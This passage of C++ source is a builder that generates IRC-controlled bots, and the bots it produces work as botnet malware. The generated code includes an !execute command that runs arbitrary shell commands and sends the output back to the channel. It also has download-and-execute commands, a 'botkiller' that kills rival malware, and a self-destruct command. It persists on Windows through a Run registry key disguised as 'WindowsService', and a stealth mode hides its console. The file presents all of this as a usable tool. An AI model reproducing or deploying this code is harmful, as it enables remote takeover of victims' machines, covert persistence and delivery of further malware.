        code << "            size_t pos2 = line.find(\" PRIVMSG \");\n";
        code << "            size_t pos3 = line.find(\" :\");\n";
        code << "            if (pos1 != std::string::npos && pos2 != std::string::npos && pos3 != std::string::npos) {\n";
        code << "                std::string sender = line.substr(1, pos1 - 1);\n";
        code << "                std::string target = line.substr(pos2 + 9, line.find(' ', pos2 + 9) - pos2 - 9);\n";
        code << "                std::string message = line.substr(pos3 + 2);\n";
        code << "                log(\"MSG from \" + sender + \" in \" + target + \": \" + message);\n";
        code << "                if (message[0] == '!') {\n";
        code << "                    handleCommand(sender, target, message);\n";
        code << "                }\n";
        code << "            }\n";
        code << "        }\n";
        code << "    }\n\n";
        
        // Enhanced command handler
        code << "    void handleCommand(const std::string& sender, const std::string& target, const std::string& message) {\n";
        code << "        std::istringstream iss(message);\n";
        code << "        std::string command;\n";
        code << "        iss >> command;\n\n";
        
        // Public commands
        code << "        if (command == \"!help\") {\n";
        code << "            std::string help = \"Available commands: !help, !time, !version, !status, !ping\";\n";
        if (useRandomNicknames) {
            code << "            help += \", !nick\";\n";
        }
        code << "            if (isAdmin(sender)) {\n";
        code << "                help += \", !join, !part, !say, !quit, !restart\";\n";
                 if (enableDownloadFeatures) {
             code << "                help += \", !download, !install, !downloadinstall\";\n";
         }
         if (enableBotkiller) {
             code << "                help += \", !scan, !kill, !selfdestruct\";\n";
         }
         code << "                help += \", !upload, !execute\";\n";
        code << "            }\n";
        code << "            sendCommand(\"PRIVMSG \" + target + \" :\" + help);\n";
        code << "        }\n";
        
        code << "        else if (command == \"!time\") {\n";
        code << "            auto now = std::chrono::system_clock::now();\n";
        code << "            auto time_t = std::chrono::system_clock::to_time_t(now);\n";
        code << "            std::string timeStr = std::ctime(&time_t);\n";
        code << "            timeStr.pop_back();\n";
        code << "            sendCommand(\"PRIVMSG \" + target + \" :Current time: \" + timeStr);\n";
        code << "        }\n";
        
        code << "        else if (command == \"!version\") {\n";
        code << "            sendCommand(\"PRIVMSG \" + target + \" :Star-2 Enhanced mIRC Bot v2.0\");\n";
        code << "        }\n";
        
        code << "        else if (command == \"!status\") {\n";
        code << "            sendCommand(\"PRIVMSG \" + target + \" :Enhanced bot is online and running\");\n";
        code << "        }\n";
        
        code << "        else if (command == \"!ping\") {\n";
        code << "            sendCommand(\"PRIVMSG \" + target + \" :Pong!\");\n";
        code << "        }\n";
        
        if (useRandomNicknames) {
            code << "        else if (command == \"!nick\") {\n";
            code << "            std::string newNick = generateRandomBotName();\n";
            code << "            sendCommand(\"NICK \" + newNick);\n";
            code << "            sendCommand(\"PRIVMSG \" + target + \" :Changed nickname to: \" + newNick);\n";
            code << "            botName = newNick;\n";
            code << "        }\n";
        }
        
        // Admin commands
        code << "        else if (isAdmin(sender)) {\n";
        code << "            if (command == \"!join\") {\n";
        code << "                std::string newChannel;\n";
        code << "                iss >> newChannel;\n";
        code << "                if (!newChannel.empty()) {\n";
        code << "                    if (newChannel[0] != '#') newChannel = \"#\" + newChannel;\n";
        code << "                    sendCommand(\"JOIN \" + newChannel);\n";
        code << "                }\n";
        code << "            }\n";
        
        code << "            else if (command == \"!part\") {\n";
        code << "                std::string partChannel;\n";
        code << "                iss >> partChannel;\n";
        code << "                if (!partChannel.empty()) {\n";
        code << "                    if (partChannel[0] != '#') partChannel = \"#\" + partChannel;\n";
        code << "                    sendCommand(\"PART \" + partChannel);\n";
        code << "                }\n";
        code << "            }\n";
        
        code << "            else if (command == \"!say\") {\n";
        code << "                std::string sayChannel, sayMessage;\n";
        code << "                iss >> sayChannel;\n";
        code << "                std::getline(iss, sayMessage);\n";
        code << "                if (!sayChannel.empty() && !sayMessage.empty()) {\n";
        code << "                    if (sayChannel[0] != '#') sayChannel = \"#\" + sayChannel;\n";
        code << "                    sendCommand(\"PRIVMSG \" + sayChannel + \" :\" + sayMessage);\n";
        code << "                }\n";
        code << "            }\n";
        
        if (enableDownloadFeatures) {
            code << "            else if (command == \"!download\") {\n";
            code << "                std::string url, filename;\n";
            code << "                iss >> url >> filename;\n";
            code << "                if (!url.empty() && !filename.empty()) {\n";
            code << "                    std::string fullPath = downloadDir + \"/\" + filename;\n";
            code << "                    if (downloadFile(url, fullPath)) {\n";
            code << "                        sendCommand(\"PRIVMSG \" + target + \" :File downloaded: \" + filename);\n";
            code << "                        log(\"Downloaded: \" + url + \" -> \" + fullPath);\n";
            code << "                    } else {\n";
            code << "                        sendCommand(\"PRIVMSG \" + target + \" :Download failed: \" + url);\n";
            code << "                    }\n";
            code << "                } else {\n";
            code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !download <url> <filename>\");\n";
            code << "                }\n";
            code << "            }\n";
            
            code << "            else if (command == \"!install\") {\n";
            code << "                std::string filename;\n";
            code << "                iss >> filename;\n";
            code << "                if (!filename.empty()) {\n";
            code << "                    std::string fullPath = downloadDir + \"/\" + filename;\n";
            code << "                    executeFile(fullPath);\n";
            code << "                    sendCommand(\"PRIVMSG \" + target + \" :Executing: \" + filename);\n";
            code << "                    log(\"Executed: \" + fullPath);\n";
            code << "                } else {\n";
            code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !install <filename>\");\n";
            code << "                }\n";
            code << "            }\n";
            
            code << "            else if (command == \"!downloadinstall\") {\n";
            code << "                std::string url, filename;\n";
            code << "                iss >> url >> filename;\n";
            code << "                if (!url.empty() && !filename.empty()) {\n";
            code << "                    std::string fullPath = downloadDir + \"/\" + filename;\n";
            code << "                    if (downloadFile(url, fullPath)) {\n";
            code << "                        sendCommand(\"PRIVMSG \" + target + \" :Downloaded and executing: \" + filename);\n";
            code << "                        executeFile(fullPath);\n";
            code << "                        log(\"Downloaded and executed: \" + url + \" -> \" + fullPath);\n";
            code << "                    } else {\n";
            code << "                        sendCommand(\"PRIVMSG \" + target + \" :Download failed: \" + url);\n";
            code << "                    }\n";
            code << "                } else {\n";
            code << "                    sendCommand(\"PRIVMSG \" + target + \" :Usage: !downloadinstall <url> <filename>\");\n";
            code << "                }\n";
            code << "            }\n";
        }
        
        code << "            else if (command == \"!execute\") {\n";
        code << "                std::string cmd;\n";
        code << "                std::getline(iss, cmd);\n";
        code << "                if (!cmd.empty()) {\n";
        code << "                    if (cmd[0] == ' ') cmd = cmd.substr(1);\n";
        code << "                    FILE* pipe = popen(cmd.c_str(), \"r\");\n";
        code << "                    if (pipe) {\n";
        code << "                        char buffer[128];\n";
        code << "                        std::string result = \"\";\n";
        code << "                        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {\n";
        code << "                            result += buffer;\n";
        code << "                        }\n";
        code << "                        pclose(pipe);\n";
        code << "                        if (result.length() > 400) {\n";
        code << "                            sendCommand(\"PRIVMSG \" + target + \" :Output (truncated): \" + result.substr(0, 400) + \"...\");\n";
        code << "                        } else {\n";
        code << "                            sendCommand(\"PRIVMSG \" + target + \" :Output: \" + result);\n";
        code << "                        }\n";
        code << "                    }\n";
        code << "                }\n";
        code << "            }\n";
        
                 if (enableBotkiller) {
             code << "            else if (command == \"!scan\") {\n";
             code << "                if (botkillerEnabled) {\n";
             code << "                    std::string scanResults = scanForMalware();\n";
             code << "                    if (scanResults.length() > 400) {\n";
             code << "                        sendCommand(\"PRIVMSG \" + target + \" :Scan results (truncated): \" + scanResults.substr(0, 400) + \"...\");\n";
             code << "                    } else {\n";
             code << "                        sendCommand(\"PRIVMSG \" + target + \" :Scan results: \" + scanResults);\n";
             code << "                    }\n";
             code << "                    log(\"Malware scan completed\");\n";
             code << "                } else {\n";
             code << "                    sendCommand(\"PRIVMSG \" + target + \" :Botkiller is disabled\");\n";
             code << "                }\n";
             code << "            }\n";
             
             code << "            else if (command == \"!kill\") {\n";
             code << "                if (botkillerEnabled) {\n";
             code << "                    killMalware();\n";
             code << "                    sendCommand(\"PRIVMSG \" + target + \" :Malware termination completed\");\n";
             code << "                    log(\"Malware kill operation completed\");\n";
             code << "                } else {\n";
             code << "                    sendCommand(\"PRIVMSG \" + target + \" :Botkiller is disabled\");\n";
             code << "                }\n";
             code << "            }\n";
             
             code << "            else if (command == \"!selfdestruct\") {\n";
             code << "                std::string mode;\n";
             code << "                iss >> mode;\n";
             code << "                if (mode.empty()) mode = \"clean\";\n";
             code << "                \n";
             code << "                sendCommand(\"PRIVMSG \" + target + \" :Self-destruct initiated: \" + mode);\n";
             code << "                sendCommand(\"QUIT :Self-destruct sequence activated\");\n";
             code << "                selfDestruct(mode);\n";
             code << "            }\n";
         }
         
         code << "            else if (command == \"!quit\") {\n";
         code << "                sendCommand(\"QUIT :Shutting down\");\n";
         code << "                running = false;\n";
         code << "            }\n";
         
         code << "        }\n";
         code << "    }\n\n";
        
        // Run method
        code << "    void run() {\n";
        code << "        running = true;\n\n";
        code << "        while (running) {\n";
        code << "            if (!connect()) {\n";
        code << "                if (autoReconnect) {\n";
        code << "                    log(\"Connection failed. Retrying in \" + std::to_string(reconnectDelay) + \" seconds...\");\n";
        code << "                    std::this_thread::sleep_for(std::chrono::seconds(reconnectDelay));\n";
        code << "                    continue;\n";
        code << "                } else {\n";
        code << "                    log(\"Connection failed and auto-reconnect is disabled\");\n";
        code << "                    break;\n";
        code << "                }\n";
        code << "            }\n\n";
        code << "            authenticate();\n";
        code << "            joinChannels();\n\n";
        code << "            char buffer[1024];\n";
        code << "            while (running) {\n";
        code << "                memset(buffer, 0, sizeof(buffer));\n";
        code << "                int bytes = recv(sockfd, buffer, sizeof(buffer) - 1, 0);\n\n";
        code << "                if (bytes <= 0) {\n";
        code << "                    log(\"Connection lost\");\n";
        code << "                    break;\n";
        code << "                }\n\n";
        code << "                std::string data(buffer);\n";
        code << "                std::istringstream iss(data);\n";
        code << "                std::string line;\n\n";
        code << "                while (std::getline(iss, line)) {\n";
        code << "                    if (!line.empty()) {\n";
        code << "                        handleMessage(line);\n";
        code << "                    }\n";
        code << "                }\n";
        code << "            }\n\n";
        code << "            close(sockfd);\n\n";
        code << "            if (autoReconnect && running) {\n";
        code << "                log(\"Reconnecting in \" + std::to_string(reconnectDelay) + \" seconds...\");\n";
        code << "                std::this_thread::sleep_for(std::chrono::seconds(reconnectDelay));\n";
        code << "            }\n";
        code << "        }\n";
        code << "    }\n\n";
        
        // Setup and cleanup methods
        code << "    void setupAutoStartup() {\n";
        code << "        #ifdef _WIN32\n";
        code << "        HKEY hKey;\n";
        code << "        char exePath[MAX_PATH];\n";
        code << "        GetModuleFileNameA(NULL, exePath, MAX_PATH);\n";
        code << "        \n";
        code << "        if (RegOpenKeyExA(HKEY_CURRENT_USER, \n";
        code << "            \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \n";
        code << "            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {\n";
        code << "            RegSetValueExA(hKey, \"WindowsService\", 0, REG_SZ, \n";
        code << "                (const BYTE*)exePath, strlen(exePath) + 1);\n";
        code << "            RegCloseKey(hKey);\n";
        code << "        }\n";
        code << "        #endif\n";
        code << "    }\n\n";
        
        code << "    void stop() {\n";
        code << "        running = false;\n";
        code << "        if (sockfd >= 0) {\n";
        code << "            close(sockfd);\n";
        code << "        }\n";
        code << "    }\n";
        code << "};\n\n";
        
        // Main function
        code << "int main() {\n";
        if (stealthMode) {
            code << "    // Stealth mode - hide console\n";
            code << "    #ifdef _WIN32\n";
            code << "    ShowWindow(GetConsoleWindow(), SW_HIDE);\n";
            code << "    #endif\n\n";
        }
        
        if (enableDownloadFeatures && !stealthMode) {
            code << "    // Initialize curl for downloads\n";
            code << "    #ifndef _WIN32\n";
            code << "    curl_global_init(CURL_GLOBAL_DEFAULT);\n";
            code << "    #endif\n\n";
        }
        
        code << "    EnhancedMircBot bot;\n\n";
        code << "    // Setup auto-startup\n";
        code << "    bot.setupAutoStartup();\n\n";
        code << "    // Signal handling\n";
        code << "    signal(SIGINT, [](int) {\n";
        code << "        exit(0);\n";
        code << "    });\n\n";
        code << "    try {\n";
        code << "        bot.run();\n";
        code << "    } catch (const std::exception& e) {\n";
        if (!stealthMode) {
            code << "        std::cerr << \"Error: \" << e.what() << std::endl;\n";
        }
        code << "    }\n\n";
        
        if (enableDownloadFeatures && !stealthMode) {
            code << "    // Cleanup curl\n";
            code << "    #ifndef _WIN32\n";
            code << "    curl_global_cleanup();\n";
            code << "    #endif\n\n";
        }
        
        code << "    return 0;\n";
        code << "}\n";
        
        return code.str();
    }
};

int main() {
    EnhancedMircBotBuilder builder;
    std::string choice;
    
    std::cout << "Welcome to Star-2 Enhanced mIRC Bot Builder!\n";
    std::cout << "This tool creates advanced IRC bots with enhanced features.\n";
    std::cout << "New features: Random nicknames, Download/Install, Stealth mode\n";
    
    while (true) {
        builder.showMenu();
        std::getline(std::cin, choice);
        
        if (choice == "1") {
            builder.setBotName();
        } else if (choice == "2") {
            builder.setServer();
        } else if (choice == "3") {
            builder.setChannel();
        } else if (choice == "4") {
            builder.setPassword();
        } else if (choice == "5") {
            builder.setRealName();
        } else if (choice == "6") {
            builder.addAutoJoinChannels();
        } else if (choice == "7") {
            builder.addAdminUsers();
        } else if (choice == "8") {
            builder.setAutoReconnect();
        } else if (choice == "9") {
            builder.setLogFile();
        } else if (choice == "10") {
            builder.toggleRandomNicknames();
        } else if (choice == "11") {
            builder.toggleDownloadFeatures();
        } else if (choice == "12") {
            builder.setDownloadDirectory();
        } else if (choice == "13") {
            builder.toggleStealthMode();
        } else if (choice == "14") {
            builder.toggleBotkiller();
        } else if (choice == "15") {
            builder.manageSuspiciousProcessNames();
        } else if (choice == "16") {
            builder.manageSuspiciousPorts();
        } else if (choice == "17") {
            builder.showSettings();
        } else if (choice == "18") {
            builder.generateBot();
        } else if (choice == "19") {
            std::cout << "Goodbye!\n";
            break;
        } else {
            std::cout << "Invalid option. Please try again.\n";
        }
    }
    
    return 0;
}